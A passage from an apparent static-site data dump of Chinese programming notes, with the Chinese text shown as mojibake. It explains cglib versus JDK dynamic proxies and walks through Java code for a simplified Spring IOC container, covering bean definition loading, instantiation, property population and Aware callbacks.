request.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n# cglib ä»£ç\n\ncglib æ¯ä¸ä¸ªå¼ºå¤§ç java å­èç çæåºï¼è½å¤å¨è¿è¡æ¶å¨æå°çæä»£çå¯¹è±¡ãä¸åºäºæ¥å£çå¨æä»£çä¸åï¼cglib å¨æä»£çå¯ä»¥ä»£çæ²¡æå®ç°æ¥å£çç±»ã\n\nä½¿ç¨ cglib å¨æä»£çéè¦ä¾èµ cglib åºï¼å¯ä»¥éè¿ maven ç­æå»ºå·¥å·å¼å¥ãä¸é¢æ¯ä¸ä¸ªç®åçä½¿ç¨ cglib å¨æä»£ççç¤ºä¾ï¼\n\n 1. å®ä¹ä¸ä¸ªéè¦ä»£ççç±» personï¼å¹¶å®ä¹å¶ç¸å³æ¹æ³ã\n\npublic class person {\n    public void eat() {\n        system.out.println("person: eating");\n    }\n\n    public void sleep() {\n        system.out.println("person: sleeping");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 2. åå»ºä¸ä¸ª methodinterceptor å¯¹è±¡ï¼å¨ intercept () æ¹æ³ä¸­å®ç°å¯¹è¢«ä»£çå¯¹è±¡æ¹æ³çå¢å¼ºã\n\nimport net.sf.cglib.proxy.methodinterceptor;\nimport net.sf.cglib.proxy.methodproxy;\n\nimport java.lang.reflect.method;\n\npublic class mymethodinterceptor implements methodinterceptor {\n    @override\n    public object intercept(object obj, method method, object[] args, methodproxy proxy) throws throwable {\n        system.out.println("before " + method.getname());\n        object result = proxy.invokesuper(obj, args);\n        system.out.println("after " + method.getname());\n        return result;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n 3. ä½¿ç¨ cglib åå»ºä»£çå¯¹è±¡ï¼å¹¶è°ç¨ä»£çå¯¹è±¡çæ¹æ³ã\n\nimport net.sf.cglib.proxy.enhancer;\n\npublic class main {\n    public static void main(string[] args) {\n        enhancer enhancer = new enhancer();\n        enhancer.setsuperclass(person.class);\n        enhancer.setcallback(new mymethodinterceptor());\n\n        person person = (person)enhancer.create();\n        person.eat();\n        person.sleep();\n    }\n}\n// ç»æ\nbefore eat\nperson: eating\nafter eat\nbefore sleep\nperson: sleeping\nafter sleep\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# åºå«\n\nåºäº cglib å jdk å¨æä»£çåæä¼ç¼ºç¹ï¼åå³äºå·ä½çåºç¨åºæ¯åéæ±ãå·ä½ä¼ç¼ºç¹å¦ä¸ï¼\nä¼ç¹ï¼\n\ncglib                      jdk\nå¯ä»¥ä»£çæ²¡æå®ç°æ¥å£çç±»               ä¸éè¦ä¾èµé¢å¤çåº\nçæçä»£çç±»æ¯è¾å°ï¼æ§è¡æçé«            éç¨çæ¯æ¥å£ä»£çï¼æ´å çµæ´»åå®å¨\næ¯ææ¹æ³çº§å«çæ¦æªï¼å¯ä»¥å¯¹ç±»ä¸­çä»»ææ¹æ³è¿è¡æ¦æª   å¨ java 1.3 åä»¥ä¸çæ¬ä¸­å¯ä»¥ç´æ¥ä½¿ç¨ï¼æäºé¨ç½²åç»´æ¤\n\nç¼ºç¹ï¼\n\ncglib                           jdk\nå¯¹äº final æ¹æ³æ private æ¹æ³æ æ³è¿è¡ä»£ç   åªè½ä»£çå®ç°äºæ¥å£çç±»\nç±äºä½¿ç¨ç»§æ¿å®ç°ä»£çï¼å¯è½ä¼ç ´åè¢«ä»£çå¯¹è±¡çå°è£æ§åå®å¨æ§   çæçä»£çç±»ç¸å¯¹è¾å¤§ï¼æ§è¡æçä¸å¦åºäº java å­èç çæåºçä»£ç\nçæçä»£çç±»éè¦ä¾èµé¢å¤çåº                  åªè½å¯¹æ¥å£ä¸­çæ¹æ³è¿è¡æ¦æª',charsets:{cjk:!0}},{title:"æ ¸å¿åå®¹æè§£ IOC",frontmatter:{title:"æ ¸å¿åå®¹æè§£ IOC",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/200/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/01.spring/200.%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%E6%8B%86%E8%A7%A3%20IOC.html",relativePath:"01.æ¡æ¶/01.Spring/01.spring/200.æ ¸å¿åå®¹æè§£ IOC.md",key:"v-ff2741c6",path:"/spring/spring/200/",headers:[{level:2,title:"è¯»åXMLæä»¶",slug:"è¯»åxmlæä»¶",normalizedTitle:"è¯»å xml æä»¶",charIndex:266},{level:2,title:"å°è£ BeanDefinition",slug:"å°è£-beandefinition",normalizedTitle:"å°è£ beandefinition",charIndex:1752},{level:2,title:"BeanFactoryPostProcessor",slug:"beanfactorypostprocessor",normalizedTitle:"beanfactorypostprocessor",charIndex:6633},{level:2,title:"æ³¨åå®ç°BeanPostProcessorçç±»",slug:"æ³¨åå®ç°beanpostprocessorçç±»",normalizedTitle:"æ³¨åå®ç° beanpostprocessor çç±»",charIndex:8907},{level:2,title:"å®ä¾åBean",slug:"å®ä¾åbean",normalizedTitle:"å®ä¾å bean",charIndex:9031},{level:2,title:"æ³¨è§£å±æ§å¡«å",slug:"æ³¨è§£å±æ§å¡«å",normalizedTitle:"æ³¨è§£å±æ§å¡«å",charIndex:233},{level:2,title:"XMLå±æ§å¡«å",slug:"xmlå±æ§å¡«å",normalizedTitle:"xml å±æ§å¡«å",charIndex:244},{level:2,title:"æç¥å¯¹è±¡",slug:"æç¥å¯¹è±¡",normalizedTitle:"æç¥å¯¹è±¡",charIndex:18936},{level:2,title:"åå§åæ¹æ³ä¹å",slug:"åå§åæ¹æ³ä¹å",normalizedTitle:"åå§åæ¹æ³ä¹å",charIndex:20221},{level:2,title:"Beançåå§åæ¹æ³",slug:"beançåå§åæ¹æ³",normalizedTitle:"bean çåå§åæ¹æ³",charIndex:11230},{level:2,title:"åå§åæ¹æ³ä¹å",slug:"åå§åæ¹æ³ä¹å",normalizedTitle:"åå§åæ¹æ³ä¹å",charIndex:22301},{level:2,title:"æ³¨åéæ¯äºä»¶",slug:"æ³¨åéæ¯äºä»¶",normalizedTitle:"æ³¨åéæ¯äºä»¶",charIndex:22789},{level:2,title:"scopå¤çåä¾",slug:"scopå¤çåä¾",normalizedTitle:"scop å¤çåä¾",charIndex:25471}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"è¯»åXMLæä»¶ å°è£ BeanDefinition BeanFactoryPostProcessor æ³¨åå®ç°BeanPostProcessorçç±» å®ä¾åBean æ³¨è§£å±æ§å¡«å XMLå±æ§å¡«å æç¥å¯¹è±¡ åå§åæ¹æ³ä¹å Beançåå§åæ¹æ³ åå§åæ¹æ³ä¹å æ³¨åéæ¯äºä»¶ scopå¤çåä¾",content:'Spring æ¯ JAVA å¼åç¨å°æå¤çä¸ä¸ª WEB æ¡æ¶ï¼æ ¸å¿æ¯ IOCï¼æ§å¶åè½¬ï¼å AOPï¼é¢ååé¢ï¼ï¼ä½åä¸ºæ¶æï¼æ³è¦å¯¹ Spring è¦è¿è¡æ©å±ç­ï¼å¿é¡»è¦äºè§£ Spring ççå½å¨æãäºä»¶ãAOPãè¡ä¸ºæç¥ç­ãSpring çå½å¨æå¦ä¸å¾ï¼\n\n\n\næç¤º\n\næ¬æä¸»è¦äºè§£ spring çå½å¨æçæåªäºï¼ä»¥åä»ä»¬çæ ¸å¿ä»£ç æ¯æä¹ç¼åï¼æ´ä¸ªè¿ç¨æ¯å IOC å DI çï¼IOC å°å¯¹è±¡çåå»ºåä¾èµå³ç³»çç»´æ¤ä»ä»£ç ä¸­è±ç¦»åºæ¥ï¼éè¿éç½®è¯»ååå»ºå¯¹è±¡ï¼DI ä»æ³¨è§£å±æ§å¡«åè¿ç¨ä»¥å XML å±æ§å¡«åè¿ç¨ä¸ºå·ä½çä½ç°ã\n\n\n# è¯»å XML æä»¶\n\néè¿ ClassPathXmlApplicationContext æ¥è¯»åèµæºæä»¶ä¸ç spring.xml\n\n    @Test\n    public void test() {\n        ClassPathXmlApplicationContext applicationContext = new ClassPathXmlApplicationContext("classpath:spring.xml");\n        UserService userService = applicationContext.getBean("userService", UserService.class);\n        System.out.println("æµè¯ç»æï¼" + userService.queryUserInfo());\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\næ ¹æ®æä»¶ç±»åä½¿ç¨ä¸åçæ¹å¼è¯»åå°æµä¸­\n\n    @Override\n    public Resource getResource(String location) {\n        Assert.notNull(location, "Location must not be null");\n        if (location.startsWith(CLASSPATH_URL_PREFIX)) {\n            return new ClassPathResource(location.substring(CLASSPATH_URL_PREFIX.length()));\n        }\n        else {\n            try {\n                URL url = new URL(location);\n                return new UrlResource(url);\n            } catch (MalformedURLException e) {\n                return new FileSystemResource(location);\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nè°ç¨ XML è§£æ\n\n    @Override\n    public void loadBeanDefinitions(Resource resource) throws BeansException {\n        try {\n            try (InputStream inputStream = resource.getInputStream()) {\n                doLoadBeanDefinitions(inputStream);\n            }\n        } catch (IOException | ClassNotFoundException | DocumentException e) {\n            throw new BeansException("IOException parsing XML document from " + resource, e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# å°è£ BeanDefinition\n\nè§£æ XML çæ´ä¸ªè¿ç¨ï¼\n\n * è§£æ DOM\n * è§£æå¸¦æ @Component æ³¨è§£çç±»ï¼å¹¶å°è£ä¸º BeanDefinition æ³¨åå° BeanFactory\n * è§£æä¸æ¯ component-scan å®ä¹çç±»\n\n    protected void doLoadBeanDefinitions(InputStream inputStream) throws ClassNotFoundException, DocumentException {\n        // ä½¿ç¨ org.dom4j.io çè§£æå¨\n        SAXReader reader = new SAXReader();\n        Document document = reader.read(inputStream);\n        Element root = document.getRootElement();\n        // è§£æ context:component-scan æ ç­¾ï¼æ«æåä¸­çç±»å¹¶æåç¸å³ä¿¡æ¯ï¼ç¨äºç»è£ BeanDefinition\n        Element componentScan = root.element("component-scan");\n        if (null != componentScan) {\n            String scanPath = componentScan.attributeValue("base-package");\n            if (StrUtil.isEmpty(scanPath)) {\n                throw new BeansException("The value of base-package attribute can not be empty or null");\n            }\n            // æ«ææ´ä¸ªå\n            scanPackage(scanPath);\n        }\n        List<Element> beanList = root.elements("bean");\n        for (Element bean : beanList) {\n            String id = bean.attributeValue("id");\n            String name = bean.attributeValue("name");\n            String className = bean.attributeValue("class");\n            String initMethod = bean.attributeValue("init-method");\n            String destroyMethodName = bean.attributeValue("destroy-method");\n            String beanScope = bean.attributeValue("scope");\n            // è·å Classï¼æ¹ä¾¿è·åç±»ä¸­çåç§°\n            Class<?> clazz = Class.forName(className);\n            // ä¼åçº§ id > name\n            String beanName = StrUtil.isNotEmpty(id) ? id : name;\n            if (StrUtil.isEmpty(beanName)) {\n                beanName = StrUtil.lowerFirst(clazz.getSimpleName());\n            }\n            // å®ä¹Bean\n            BeanDefinition beanDefinition = new BeanDefinition(clazz);\n            beanDefinition.setInitMethodName(initMethod);\n            beanDefinition.setDestroyMethodName(destroyMethodName);\n            if (StrUtil.isNotEmpty(beanScope)) {\n                beanDefinition.setScope(beanScope);\n            }\n            List<Element> propertyList = bean.elements("property");\n            // è¯»åå±æ§å¹¶å¡«å\n            for (Element property : propertyList) {\n                // è§£ææ ç­¾ï¼property\n                String attrName = property.attributeValue("name");\n                String attrValue = property.attributeValue("value");\n                String attrRef = property.attributeValue("ref");\n                // è·åå±æ§å¼ï¼å¼å¥å¯¹è±¡ãå¼å¯¹è±¡\n                Object value = StrUtil.isNotEmpty(attrRef) ? new BeanReference(attrRef) : attrValue;\n                // åå»ºå±æ§ä¿¡æ¯\n                PropertyValue propertyValue = new PropertyValue(attrName, value);\n                beanDefinition.getPropertyValues().addPropertyValue(propertyValue);\n            }\n            if (getRegistry().containsBeanDefinition(beanName)) {\n                throw new BeansException("Duplicate beanName[" + beanName + "] is not allowed");\n            }\n            // æ³¨å BeanDefinition\n            getRegistry().registerBeanDefinition(beanName, beanDefinition);\n        }\n    }\n\n    private void scanPackage(String scanPath) {\n        String[] basePackages = StrUtil.splitToArray(scanPath, \',\');\n        ClassPathBeanDefinitionScanner scanner = new ClassPathBeanDefinitionScanner(getRegistry());\n        scanner.doScan(basePackages);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n\n\næ ¹æ®æä¾è·¯å¾å°è£ä¸º BeanDefinition å¹¶æ³¨åå° BeanFactory\n\n    public void doScan(String... basePackages) {\n        for (String basePackage : basePackages) {\n            Set<BeanDefinition> candidates = findCandidateComponents(basePackage);\n            for (BeanDefinition beanDefinition : candidates) {\n                // è§£æ Bean çä½ç¨å singletonãprototype\n                String beanScope = resolveBeanScope(beanDefinition);\n                if (StrUtil.isNotEmpty(beanScope)) {\n                    beanDefinition.setScope(beanScope);\n                }\n                registry.registerBeanDefinition(determineBeanName(beanDefinition), beanDefinition);\n            }\n        }\n\n        // æ³¨åå¤çæ³¨è§£ç BeanPostProcessor(@Autowiredã@Value)\n        registry.registerBeanDefinition("cn.bugstack.springframework.context.annotation.internalAutowiredAnnotationProcessor", new BeanDefinition(AutowiredAnnotationBeanPostProcessor.class));\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå¯¹æä¾çåè·¯å¾æ«ææ @Component æ³¨è§£çç±»\n\n    public Set<BeanDefinition> findCandidateComponents(String basePackage) {\n        Set<BeanDefinition> candidates = new LinkedHashSet<>();\n        Set<Class<?>> classes = ClassUtil.scanPackageByAnnotation(basePackage, Component.class);\n        for (Class<?> clazz : classes) {\n            candidates.add(new BeanDefinition(clazz));\n        }\n        return candidates;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# BeanFactoryPostProcessor\n\nBeanFactoryPostProcessor å¯ä»¥ä¿®æ¹æä»¬å¯¹ BeanDefinition å®ä¹çææä¿¡æ¯ï¼å¯ä»¥æ·»å å±æ§ï¼ä¿®æ¹å±æ§ï¼æ·»å é¢å¤çæ¹æ³ç­ãå·ä½ä¼å¯¹ææå®ç° BeanFactoryPostProcessor çç±»è¿è¡è·åï¼å¹¶å¾ªç¯è°ç¨ postProcessBeanFactory æ¹æ³\n\n    private void invokeBeanFactoryPostProcessors(ConfigurableListableBeanFactory beanFactory) {\n        Map<String, BeanFactoryPostProcessor> beanFactoryPostProcessorMap = beanFactory.getBeansOfType(BeanFactoryPostProcessor.class);\n        for (BeanFactoryPostProcessor beanFactoryPostProcessor : beanFactoryPostProcessorMap.values()) {\n            beanFactoryPostProcessor.postProcessBeanFactory(beanFactory);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\næä¾ä¸ä¸ªé»è®¤çå®ç°\n\n    @Override\n    public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) throws BeansException {\n        try {\n            // å è½½å±æ§æä»¶\n            DefaultResourceLoader resourceLoader = new DefaultResourceLoader();\n            Resource resource = resourceLoader.getResource(location);\n\n            // æå±æ§æä»¶çåå®¹å è½½å°Propertieséç»æé®å¼å¯¹\n            Properties properties = new Properties();\n            properties.load(resource.getInputStream());\n            String[] beanDefinitionNames = beanFactory.getBeanDefinitionNames();\n            for (String beanName : beanDefinitionNames) {\n                BeanDefinition beanDefinition = beanFactory.getBeanDefinition(beanName);\n                PropertyValues propertyValues = beanDefinition.getPropertyValues();\n                for (PropertyValue propertyValue : propertyValues.getPropertyValues()) {\n                    Object value = propertyValue.getValue();\n                    if (!(value instanceof String)) continue;\n                    value = resolvePlaceholder((String) value, properties);\n                    propertyValues.addPropertyValue(new PropertyValue(propertyValue.getName(), value));\n                }\n            }\n            // åå®¹å¨ä¸­æ·»å å­ç¬¦ä¸²è§£æå¨ï¼ä¾è§£æ@Valueæ³¨è§£ä½¿ç¨\n            StringValueResolver valueResolver = new PlaceholderResolvingStringValueResolver(properties);\n            // æ³¨åå°å®¹å¨ï¼ä»¥ä¾¿åç»­ä½¿ç¨\n            beanFactory.addEmbeddedValueResolver(valueResolver);\n        } catch (IOException e) {\n            throw new BeansException("Could not load properties", e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# æ³¨åå®ç° BeanPostProcessor çç±»\n\nBeanPostProcessor å°±æ¯æä¾äº postProcessBeforeInitializationï¼postProcessAfterInitialization ä¸¤ç§æ¹æ³ï¼æä¾æä»¬å¨å®ä¾å Bean çæ¶åï¼ææå®ç° BeanPostProcessor çç±»ï¼æ³¨åå° List<BeanPostProcessor> beanPostProcessors = new ArrayList<BeanPostProcessor>(); ä¸­\n\n    private void registerBeanPostProcessors(ConfigurableListableBeanFactory beanFactory) {\n        Map<String, BeanPostProcessor> beanPostProcessorMap = beanFactory.getBeansOfType(BeanPostProcessor.class);\n        for (BeanPostProcessor beanPostProcessor : beanPostProcessorMap.values()) {\n            beanFactory.addBeanPostProcessor(beanPostProcessor);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# å®ä¾å Bean\n\n    protected <T> T doGetBean(final String name, final Object[] args) {\n        // ä»ç¼å­ä¸­è·åå®ä¾\n        Object sharedInstance = getSingleton(name);\n        if (sharedInstance != null) {\n            // å¦æå®ç°äº FactoryBeanï¼åéè¦è°ç¨ FactoryBean##getObject\n            return (T) getObjectForBeanInstance(sharedInstance, name);\n        }\n        // ä»BeanDefinitionåè¡¨ä¸­è·åå¯¹è±¡\n        BeanDefinition beanDefinition = getBeanDefinition(name);\n        Object bean = createBean(name, beanDefinition, args);\n        // å¦æå®ç°äº FactoryBeanï¼åéè¦è°ç¨ FactoryBean##getObject\n        return (T) getObjectForBeanInstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nå®ä¾å Bean çå·ä½æ¹æ³\n\n    protected Object doCreateBean(String beanName, BeanDefinition beanDefinition, Object[] args) {\n        Object bean = null;\n        try {\n            // å®ä¾å Bean\n            bean = createBeanInstance(beanDefinition, beanName, args);\n            // å¤çå¾ªç¯ä¾èµï¼å°å®ä¾ååçBeanå¯¹è±¡æåæ¾å¥ç¼å­ä¸­æ´é²åºæ¥\n            if (beanDefinition.isSingleton()) {\n                Object finalBean = bean;\n                addSingletonFactory(beanName, () -> getEarlyBeanReference(beanName, beanDefinition, finalBean));\n            }\n            // æ¯å¦éè¦ç»§ç»­è¿è¡åç»­çå±æ§å¡«å\n            boolean continueWithPropertyPopulation = applyBeanPostProcessorsAfterInstantiation(beanName, bean);\n            if (!continueWithPropertyPopulation) {\n                return bean;\n            }\n            // å¨è®¾ç½® Bean å±æ§ä¹åï¼åè®¸ BeanPostProcessor ä¿®æ¹å±æ§å¼ï¼æ³¨è§£å±æ§å¡«åï¼\n            applyBeanPostProcessorsBeforeApplyingPropertyValues(beanName, bean, beanDefinition);\n            // ç» Bean å¡«åå±æ§ï¼xmlå±æ§å¡«åï¼\n            applyPropertyValues(beanName, bean, beanDefinition);\n            // æ§è¡ Bean çåå§åæ¹æ³å BeanPostProcessor çåç½®ååç½®å¤çæ¹æ³\n            bean = initializeBean(beanName, bean, beanDefinition);\n        } catch (Exception e) {\n            throw new BeansException("Instantiation of bean failed", e);\n        }\n        // æ³¨åå®ç°äº DisposableBean æ¥å£ç Bean å¯¹è±¡\n        registerDisposableBeanIfNecessary(beanName, bean, beanDefinition);\n        // å¤æ­ SCOPE_SINGLETONãSCOPE_PROTOTYPE\n        Object exposedObject = bean;\n        if (beanDefinition.isSingleton()) {\n            // è·åä»£çå¯¹è±¡\n            exposedObject = getSingleton(beanName);\n            registerSingleton(beanName, exposedObject);\n        }\n        return exposedObject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\ncreateBeanInstance ä½¿ç¨äº CGLIB æ¥å®ä¾åä¸ä¸ª Bean, ä¹å¯ä»¥ä½¿ç¨ JAVA èªå¸¦çåå°\n\n    protected Object createBeanInstance(BeanDefinition beanDefinition, String beanName, Object[] args) {\n        Constructor constructorToUse = null;\n        Class<?> beanClass = beanDefinition.getBeanClass();\n        Constructor<?>[] declaredConstructors = beanClass.getDeclaredConstructors();\n        for (Constructor ctor : declaredConstructors) {\n            if (null != args && ctor.getParameterTypes().length == args.length) {\n                constructorToUse = ctor;\n                break;\n            }\n        }\n        return getInstantiationStrategy().instantiate(beanDefinition, beanName, constructorToUse, args);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nCGLIB å®ç°å®ä¾å\n\n@Override\n    public Object instantiate(BeanDefinition beanDefinition, String beanName, Constructor ctor, Object[] args) throws BeansException {\n        Enhancer enhancer = new Enhancer();\n        enhancer.setSuperclass(beanDefinition.getBeanClass());\n        enhancer.setCallback(new NoOp() {\n            @Override\n            public int hashCode() {\n                return super.hashCode();\n            }\n        });\n        if (null == ctor) return enhancer.create();\n        return enhancer.create(ctor.getParameterTypes(), args);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nJAVA åå°å®ç°åºåå\n\n    @Override\n    public Object instantiate(BeanDefinition beanDefinition, String beanName, Constructor ctor, Object[] args) throws BeansException {\n        Class clazz = beanDefinition.getBeanClass();\n        try {\n            if (null != ctor) {\n                return clazz.getDeclaredConstructor(ctor.getParameterTypes()).newInstance(args);\n            } else {\n                return clazz.getDeclaredConstructor().newInstance();\n            }\n        } catch (NoSuchMethodException | InstantiationException | IllegalAccessException | InvocationTargetException e) {\n            throw new BeansException("Failed to instantiate [" + clazz.getName() + "]", e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# æ³¨è§£å±æ§å¡«å\n\næ³¨è§£å±æ§ï¼ä¼ä»ä¹åæ³¨åç BeanPostProcessor éå¹é InstantiationAwareBeanPostProcessor çå¯¹è±¡ï¼å¶ä¸­é»è®¤ç AutowiredAnnotationBeanPostProcessor å·ä½å®ç°äºè¯¥ç±»\n\n    protected void applyBeanPostProcessorsBeforeApplyingPropertyValues(String beanName, Object bean, BeanDefinition beanDefinition) {\n        for (BeanPostProcessor beanPostProcessor : getBeanPostProcessors()) {\n            if (beanPostProcessor instanceof InstantiationAwareBeanPostProcessor) {\n                PropertyValues pvs = ((InstantiationAwareBeanPostProcessor) beanPostProcessor).postProcessPropertyValues(beanDefinition.getPropertyValues(), bean, beanName);\n                if (null != pvs) {\n                    for (PropertyValue propertyValue : pvs.getPropertyValues()) {\n                        beanDefinition.getPropertyValues().addPropertyValue(propertyValue);\n                    }\n                }\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nAutowiredAnnotationBeanPostProcessor æç¥æ³¨è§£å±æ§å¡«å\n\n    @Override\n    public PropertyValues postProcessPropertyValues(PropertyValues pvs, Object bean, String beanName) throws BeansException {\n        Class<?> clazz = bean.getClass();\n        clazz = ClassUtils.isCglibProxyClass(clazz) ? clazz.getSuperclass() : clazz;\n        // è·å¾å¯¹è±¡ææå­æ®µ\n        Field[] declaredFields = clazz.getDeclaredFields();\n        for (Field field : declaredFields) {\n            // @Value æ³¨è§£\n            Value valueAnnotation = field.getAnnotation(Value.class);\n            if (null != valueAnnotation) {\n                Object value = valueAnnotation.value();\n                // è§£æå¾å°å¼\n                value = beanFactory.resolveEmbeddedValue((String) value);\n                // ç±»åè½¬æ¢\n                Class<?> sourceType = value.getClass();\n                Class<?> targetType = (Class<?>) TypeUtil.getType(field);\n                // å¯¹å¼è¿è¡è½¬æ¢å¤ç\n                ConversionService conversionService = beanFactory.getConversionService();\n                if (conversionService != null) {\n                    if (conversionService.canConvert(sourceType, targetType)) {\n                        value = conversionService.convert(value, targetType);\n                    }\n                }\n                // æå¼è®¾ç½®è¿å»\n                BeanUtil.setFieldValue(bean, field.getName(), value);\n            }\n        }\n        // 2. å¤çæ³¨è§£ @Autowired\n        for (Field field : declaredFields) {\n            Autowired autowiredAnnotation = field.getAnnotation(Autowired.class);\n            if (null != autowiredAnnotation) {\n                Class<?> fieldType = field.getType();\n                String dependentBeanName = null;\n                Qualifier qualifierAnnotation = field.getAnnotation(Qualifier.class);\n                Object dependentBean = null;\n                if (null != qualifierAnnotation) {\n                    dependentBeanName = qualifierAnnotation.value();\n                    dependentBean = beanFactory.getBean(dependentBeanName, fieldType);\n                } else {\n                    dependentBean = beanFactory.getBean(fieldType);\n                }\n                BeanUtil.setFieldValue(bean, field.getName(), dependentBean);\n            }\n        }\n        return pvs;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# XML å±æ§å¡«å\n\nXML å±æ§å¡«åè¿éè¯´è¿ä¼åºç°å¾ªç¯ä¾èµçé®é¢ï¼å¨å®ä¾åé¶æ®µçååå·²ç»å¯¹è¿ä¸ªå¤çäºï¼åç»­ä¼åç¬è®²è§£\n\n    protected void applyPropertyValues(String beanName, Object bean, BeanDefinition beanDefinition) {\n        try {\n            PropertyValues propertyValues = beanDefinition.getPropertyValues();\n            for (PropertyValue propertyValue : propertyValues.getPropertyValues()) {\n                String name = propertyValue.getName();\n                Object value = propertyValue.getValue();\n                if (value instanceof BeanReference) {\n                    // A ä¾èµ Bï¼è·å B çå®ä¾å\n                    BeanReference beanReference = (BeanReference) value;\n                    value = getBean(beanReference.getBeanName());\n                }\n                // ç±»åè½¬æ¢\n                else {\n                    Class<?> sourceType = value.getClass();\n                    Class<?> targetType = (Class<?>) TypeUtil.getFieldType(bean.getClass(), name);\n                    ConversionService conversionService = getConversionService();\n                    if (conversionService != null) {\n                        if (conversionService.canConvert(sourceType, targetType)) {\n                            value = conversionService.convert(value, targetType);\n                        }\n                    }\n                }\n                // åå°è®¾ç½®å±æ§å¡«å\n                 BeanUtil.setFieldValue(bean, name, value);\n            }\n        } catch (Exception e) {\n            throw new BeansException("Error setting property valuesï¼" + beanName + " messageï¼" + e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# æç¥å¯¹è±¡\n\næç¥å¯¹è±¡åä¸ºä¸ä¸ªæ©å±æ¥å£ï¼åªè¦æä»¬ç Bean å®ç°äºè¿äºæ¥å£ï¼å°±å¯ä»¥ä¸ºæä»¬ç Bean æä¾é¢å¤çè½å\n\n    private Object initializeBean(String beanName, Object bean, BeanDefinition beanDefinition) {\n        // invokeAwareMethodsï¼æç¥å¯¹è±¡ï¼\n        if (bean instanceof Aware) {\n            if (bean instanceof BeanFactoryAware) {\n                ((BeanFactoryAware) bean).setBeanFactory(this);\n            }\n            if (bean instanceof BeanClassLoaderAware) {\n                ((BeanClassLoaderAware) bean).setBeanClassLoader(getBeanClassLoader());\n            }\n            if (bean instanceof BeanNameAware) {\n                ((BeanNameAware) bean).setBeanName(beanName);\n            }\n        }\n        // 1. æ§è¡ BeanPostProcessor Before å¤ç\n        Object wrappedBean = applyBeanPostProcessorsBeforeInitialization(bean, beanName);\n        // æ§è¡ Bean å¯¹è±¡çåå§åæ¹æ³\n        try {\n            invokeInitMethods(beanName, wrappedBean, beanDefinition);\n        } catch (Exception e) {\n            throw new BeansException("Invocation of init method of bean[" + beanName + "] failed", e);\n        }\n        // 2. æ§è¡ BeanPostProcessor After å¤ç\n        wrappedBean = applyBeanPostProcessorsAfterInitialization(wrappedBean, beanName);\n        return wrappedBean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# åå§åæ¹æ³ä¹å\n\nå¨ Bean çåå§åæ¹æ³ä¹åè°ç¨ï¼é»è®¤æä¾äº applicationContext çä¸ä¸ææ³¨å¥ï¼å½æä¸ªç±»å®ç°äº ApplicationContextAwareï¼å°±æä¾ applicationContext ä¸ä¸æçè½åï¼åªæ¯æä»¬è¦å®ç°çæ¯ ApplicationContextAware ï¼å¹¶ä¸æ¯ BeanPostProcessor\n\n    @Override\n    public Object applyBeanPostProcessorsBeforeInitialization(Object existingBean, String beanName) throws BeansException {\n        Object result = existingBean;\n        for (BeanPostProcessor processor : getBeanPostProcessors()) {\n            Object current = processor.postProcessBeforeInitialization(result, beanName);\n            if (null == current) return result;\n            result = current;\n        }\n        return result;\n    